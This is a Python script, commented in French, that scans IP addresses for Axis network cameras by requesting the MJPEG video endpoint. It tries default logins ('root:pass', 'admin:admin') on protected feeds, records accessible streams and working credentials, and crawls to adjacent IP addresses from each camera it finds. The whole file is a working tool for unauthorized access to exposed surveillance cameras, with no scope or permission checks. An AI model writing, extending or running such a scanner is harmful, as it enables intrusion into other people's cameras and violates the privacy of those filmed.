import requests
import logging
import json
import os
from collections import deque
from urllib.parse import urlparse
import ipaddress

# Configuration du logging pour afficher les logs dans la console
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def load_camera_urls(json_file):
    """
    Charge la liste des URL des caméras à partir d'un fichier JSON.

    :param json_file: Chemin vers le fichier JSON contenant les URL.
    :return: Liste des URL des caméras.
    """
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            camera_urls = json.load(f)
            logging.info(f"{len(camera_urls)} URL de caméras chargées depuis {json_file}")
            return camera_urls
    except FileNotFoundError:
        logging.error(f"Le fichier {json_file} n'a pas été trouvé.")
        return []
    except json.JSONDecodeError as e:
        logging.error(f"Erreur lors de la lecture du fichier JSON {json_file}: {e}")
        return []

def save_working_camera(url, output_file):
    """
    Sauvegarde une URL de caméra fonctionnelle dans un fichier JSON.

    :param url: L'URL de la caméra fonctionnelle.
    :param output_file: Chemin vers le fichier JSON où enregistrer les caméras fonctionnelles.
    """
    try:
        if os.path.exists(output_file):
            with open(output_file, 'r', encoding='utf-8') as f:
                working_cameras = json.load(f)
        else:
            working_cameras = []

        if url not in working_cameras:
            working_cameras.append(url)

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(working_cameras, f, ensure_ascii=False, indent=4)
        logging.info(f"Caméra fonctionnelle enregistrée: {url}")
    except Exception as e:
        logging.error(f"Erreur lors de l'écriture du fichier {output_file}: {e}")

def save_tested_camera(ip, tested_file):
    """
    Sauvegarde une adresse IP de caméra testée dans un fichier JSON.

    :param ip: L'adresse IP de la caméra testée.
    :param tested_file: Chemin vers le fichier JSON où enregistrer les caméras testées.
    """
    try:
        ip = ip.replace("http://", "").replace("https://", "")
        if os.path.exists(tested_file):
            with open(tested_file, 'r', encoding='utf-8') as f:
                tested_cameras = json.load(f)
        else:
            tested_cameras = []

        if ip not in tested_cameras:
            tested_cameras.append(ip)

        with open(tested_file, 'w', encoding='utf-8') as f:
            json.dump(tested_cameras, f, ensure_ascii=False, indent=4)
        logging.info(f"Caméra testée enregistrée: {ip}")
    except Exception as e:
        logging.error(f"Erreur lors de l'écriture du fichier {tested_file}: {e}")

def load_tested_cameras(tested_file):
    """
    Charge la liste des caméras testées à partir d'un fichier JSON.

    :param tested_file: Chemin vers le fichier JSON contenant les caméras testées.
    :return: Liste des caméras testées.
    """
    try:
        if os.path.exists(tested_file):
            with open(tested_file, 'r', encoding='utf-8') as f:
                tested_cameras = json.load(f)
                return tested_cameras
        return []
    except Exception as e:
        logging.error(f"Erreur lors de la lecture du fichier {tested_file}: {e}")
        return []

def extract_ip_from_url(url):
    """
    Extrait l'adresse IP d'une URL.

    :param url: L'URL à partir de laquelle extraire l'IP.
    :return: L'adresse IP sous forme de chaîne de caractères.
    """
    try:
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        return hostname
    except Exception as e:
        logging.error(f"Erreur lors de l'extraction de l'IP depuis l'URL {url}: {e}")
        return None

def get_neighboring_ips(ip):
    """
    Génère les adresses IP voisines en ajoutant ou en soustrayant 1 au dernier octet.

    :param ip: L'adresse IP de base.
    :return: Liste des adresses IP voisines.
    """
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return []
        last_octet = int(parts[3])
        base_ip = '.'.join(parts[:3])
        neighbors = []
        if 0 < last_octet < 255:
            neighbors.append(f"{base_ip}.{last_octet - 1}")
            neighbors.append(f"{base_ip}.{last_octet + 1}")
        elif last_octet == 0:
            neighbors.append(f"{base_ip}.{last_octet + 1}")
        elif last_octet == 255:
            neighbors.append(f"{base_ip}.{last_octet - 1}")
        return neighbors
    except ValueError:
        logging.error(f"Adresse IP invalide: {ip}")
        return []
from requests.auth import HTTPBasicAuth

def test_camera_connection(ip, output_file, tested_file):
    logging.info(f"Test de connexion à {ip}")
    ip = ip.replace("http://", "").replace("https://", "")
    url = "http://" + ip

    # Liste des endpoints communs pour les flux vidéo des caméras Axis
    video_endpoints = [
        '/axis-cgi/mjpg/video.cgi'  # Endpoint alternatif
    ]

    camera_found = False
    passwords_found = []

    # Credentials to try
    credentials = [
        HTTPBasicAuth('root', 'pass'),
        HTTPBasicAuth('admin', 'admin')
    ]

    # Tente d'accéder à chaque endpoint pour voir si le flux vidéo est accessible
    for endpoint in video_endpoints:
        full_url = url.rstrip('/') + endpoint
        try:
            logging.debug(f"Tentative de connexion à {full_url}")
            response = requests.get(full_url, timeout=5, stream=True)
            logging.debug(f"Réponse reçue avec le code {response.status_code}")

            if response.status_code == 200:
                content_type = response.headers.get('Content-Type', '')
                logging.debug(f"Content-Type : {content_type}")

                if 'image/jpeg' in content_type or 'multipart/x-mixed-replace' in content_type:
                    logging.info(f"[SUCCÈS] Flux vidéo accessible à {full_url}")
                    save_working_camera(full_url, output_file)
                    camera_found = True
                    break

            # Try each credential if authentication is required
            elif response.status_code == 401:
                logging.info(f"[INFO] Authentification requise pour {full_url}, tentative avec les credentials")
                for auth in credentials:
                    try:
                        auth_response = requests.get(full_url, timeout=5, stream=True, auth=auth)
                        if auth_response.status_code == 200:
                            logging.info(f"[SUCCÈS] Accès avec l'authentification pour {full_url} avec {auth.username}:{auth.password}")
                            save_working_camera(full_url, output_file)
                            passwords_found.append(f"{auth.username}:{auth.password}")
                            camera_found = True
                            break
                    except requests.RequestException as e:
                        logging.error(f"[ERREUR] Erreur lors de l'authentification à {full_url} avec {auth.username}:{auth.password} : {e}")

            else:
                logging.warning(f"[ATTENTION] Code de statut {response.status_code} lors de l'accès à {full_url}")
        except requests.RequestException as e:
            logging.error(f"[ERREUR] Erreur lors de la connexion à {full_url} : {e}")

    save_tested_camera(ip, tested_file)

    if not camera_found:
        logging.info(f"[INFO] Aucun flux vidéo détecté pour {url} sur les endpoints testés")
    else:
        logging.info(f"[INFO] Credentials trouvés: {passwords_found}")

    return camera_found, passwords_found

def main():
    # Chemin vers le fichier JSON contenant les URL des caméras
    json_file = os.path.join(os.path.dirname(__file__), 'cameras.json')
    # Chemin vers le fichier JSON où seront enregistrées les caméras fonctionnelles
    output_file = os.path.join(os.path.dirname(__file__), 'working_cameras.json')
    # Chemin vers le fichier JSON où seront enregistrées les caméras testées
    tested_file = os.path.join(os.path.dirname(__file__), 'tested_cameras.json')

    # Charge les URL des caméras depuis le fichier JSON
    camera_urls = load_camera_urls(json_file)

    # Charge les caméras déjà testées pour éviter de les tester à nouveau
    tested_cameras = set(load_tested_cameras(tested_file))

    # Charge les caméras fonctionnelles
    if os.path.exists(output_file):
        with open(output_file, 'r', encoding='utf-8') as f:
            working_cameras = json.load(f)
    else:
        working_cameras = []

    # Set pour stocker les IP déjà testées
    tested_ips = set(tested_cameras)

    # Queue pour les IP à tester
    ip_queue = deque()

    # Ajoute les IPs voisines des caméras fonctionnelles à la queue
    for working_url in working_cameras:
        ip = extract_ip_from_url(working_url)
        if ip:
            if ip not in tested_ips:
                ip_queue.append(ip)
            neighbors = get_neighboring_ips(ip)
            for neighbor_ip in neighbors:
                if neighbor_ip not in tested_ips:
                    ip_queue.append(neighbor_ip)
    # Ajoute les IPs de camera_urls à la queue
    for url in camera_urls:
        # Extract IP from URL
        if "http" not in url:
            ip = url
        else:
            ip = extract_ip_from_url(url)
        if ip and ip not in tested_ips:
            ip_queue.append(ip)

    successful_credentials = []

    while ip_queue:
        ip = ip_queue.popleft()
        if ip in tested_ips:
            continue
        camera_found, credentials = test_camera_connection(ip, output_file, tested_file)
        tested_ips.add(ip)

        if camera_found:
            successful_credentials.extend(credentials)
            neighbors = get_neighboring_ips(ip)
            for neighbor_ip in neighbors:
                if neighbor_ip not in tested_ips:
                    ip_queue.append(neighbor_ip)

    # Print found credentials
    if successful_credentials:
        logging.info(f"Nombre de mots de passe trouvés: {len(successful_credentials)}")
        logging.info(f"Mots de passe trouvés: {successful_credentials}")
    else:
        logging.info("Aucun mot de passe trouvé.")

if __name__ == '__main__':
    main()